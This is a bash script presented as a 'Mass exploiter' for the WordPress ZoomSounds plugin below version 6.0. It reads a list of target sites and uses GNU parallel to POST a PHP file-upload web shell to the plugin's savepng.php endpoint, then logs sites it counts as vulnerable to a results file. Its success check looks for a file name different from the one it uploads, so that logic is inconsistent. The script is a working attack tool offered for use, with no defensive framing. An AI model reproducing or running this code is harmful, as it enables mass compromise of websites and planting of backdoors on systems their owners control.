#!/bin/bash
#Adalah gw
#kyu_kazami

cat << "EOF"

███████╗░█████╗░░█████╗░███╗░░░███╗░██████╗░█████╗░██╗░░░██╗███╗░░██╗██████╗░
╚════██║██╔══██╗██╔══██╗████╗░████║██╔════╝██╔══██╗██║░░░██║████╗░██║██╔══██╗
░░███╔═╝██║░░██║██║░░██║██╔████╔██║╚█████╗░██║░░██║██║░░░██║██╔██╗██║██║░░██║
██╔══╝░░██║░░██║██║░░██║██║╚██╔╝██║░╚═══██╗██║░░██║██║░░░██║██║╚████║██║░░██║
███████╗╚█████╔╝╚█████╔╝██║░╚═╝░██║██████╔╝╚█████╔╝╚██████╔╝██║░╚███║██████╔╝
╚══════╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░░╚════╝░░╚═════╝░╚═╝░░╚══╝╚═════╝░

EOF

printf "   Mass exploiter ZoomSounds < 6.0   \n"
printf "   Usage : bash $0 <list> <thread>   \n"

exploit(){
classic='\033[0m'
red='\e[41m'
green='\e[42m'
site=$1
thread=$2 

if [[ $(curl -s --max-time 10 --connect-timeout 10 -d '<?php echo "<form method=post enctype=multipart/form-data><input type=file name=gntng><input type=submit name=upload value=upload></form>";if($_POST[upload]){if(@copy($_FILES[gntng][tmp_name], $_FILES[gntng][name])){echo "Sukses 😛";}else{ echo "Gagal!";}}?>' $site"/wp-content/plugins/dzs-zoomsounds/savepng.php?location=gate.php") =~ "mirdin.php" ]]; then
	printf "${green}[Vuln]${classic} => $site/wp-content/plugins/dzs-zoomsounds/mirdin.php \n"
	printf "$site/wp-content/plugins/dzs-zoomsounds/mirdin.php\n" >> zoom_res.txt
	else
	printf "${red}[Not Vuln]${classic} => $site \n"
fi
}

export -f exploit
parallel -j $2 exploit :::: $1 